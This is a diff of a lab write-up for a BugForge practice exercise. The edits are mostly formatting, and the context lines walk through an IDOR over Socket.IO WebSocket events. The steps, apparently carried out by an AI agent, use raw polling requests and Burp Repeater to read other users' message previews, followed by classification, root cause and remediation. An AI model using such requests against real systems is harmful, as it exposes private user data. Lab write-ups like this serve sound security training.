@@ -43,7 +43,7 @@ tags:
 
 ### MCP Walkthrough using manual polling
 
-Here’s exactly what I did in your new session, step‑by‑step, and what I saw.
+Here’s exactly what I did in your new session, step-by-step, and what I saw.
 
   1) Identify an auth token
 
@@ -52,7 +52,7 @@ Here’s exactly what I did in your new session, step‑by‑step, and what I sa
 
   2) Start a Socket.IO polling session
 
-```html
+```
 GET /socket.io/?EIO=4&transport=polling&t=codex1 HTTP/1.1
 Host: lab-1768638544942-8i42y0.labs-app.bugforge.io
 
@@ -63,7 +63,7 @@ sid = aUep-CgMwIZPnL3nAAAK
 
   3) Authenticate the socket (send JWT)
 
- ```html
+ ```
 POST /socket.io/?EIO=4&transport=polling&sid=aUep-CgMwIZPnL3nAAAK HTTP/1.1
 Host: lab-1768638544942-8i42y0.labs-app.bugforge.io
 Content-Type: text/plain;charset=UTF-8
@@ -75,7 +75,7 @@ Server replied: ok
 
   4) Trigger the preview event
 
-```html
+```
 POST /socket.io/?EIO=4&transport=polling&sid=aUep-CgMwIZPnL3nAAAK HTTP/1.1
 Host: lab-1768638544942-8i42y0.labs-app.bugforge.io
 Content-Type: text/plain;charset=UTF-8
@@ -87,7 +87,7 @@ Server replied: ok
 
 5) Fetch the server response
 
-```html
+```
 GET /socket.io/?EIO=4&transport=polling&sid=aUep-CgMwIZPnL3nAAAK HTTP/1.1
 Host: lab-1768638544942-8i42y0.labs-app.bugforge.io
 
@@ -112,7 +112,7 @@ Server response contained:
 
 - Burp → Proxy → WebSockets history
 - Find the newest entry for lab-1768638544942-8i42y0.labs-app.bugforge.io
-- Right‑click → Send to Repeater (WebSocket)
+- Right-click → Send to Repeater (WebSocket)
 
   3) Send the preview event
 
@@ -134,20 +134,20 @@ Server response contained:
 
   - Unauthorized access to other users’ private message previews
   - Disclosure of sensitive content through WebSocket events
-  - Confirms broken authorization in real‑time features
+  - Confirms broken authorization in real-time features
 
 ### Vulnerability Classification
 
   - OWASP Top 10: Broken Access Control
   - Vulnerability Type: IDOR over WebSockets
-  - CWE: CWE-639 – Authorization Bypass Through User-Controlled Key
+  - CWE: CWE-639 - Authorization Bypass Through User-Controlled Key
 
 ### Root Cause
-  - The WebSocket handler trusts the client‑supplied messageId and returns previews without verifying that the authenticated user owns the message.
+  - The WebSocket handler trusts the client-supplied messageId and returns previews without verifying that the authenticated user owns the message.
 
 ### Remediation
 
   - Enforce ownership checks for all WebSocket message events
-  - Validate message access server‑side before sending previews
+  - Validate message access server-side before sending previews
   - Apply consistent authorization logic across REST and WebSocket handlers
   - Add logging/monitoring for abnormal messageId access patterns
